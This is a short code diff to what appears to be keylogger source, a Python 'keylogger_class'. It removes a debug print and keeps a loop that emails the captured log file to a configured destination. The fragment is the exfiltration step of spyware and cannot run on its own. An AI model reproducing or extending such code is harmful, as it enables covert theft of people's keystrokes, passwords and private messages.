@@ -27,7 +27,6 @@ class keylogger_class:
             #global datei_sende_name
             while True:
                 if send_go==1:
-                    print(datei_sende_name)
                     init_email.email_sender_funk(log_destination,datei_sende_name)
                     send_go=0
         
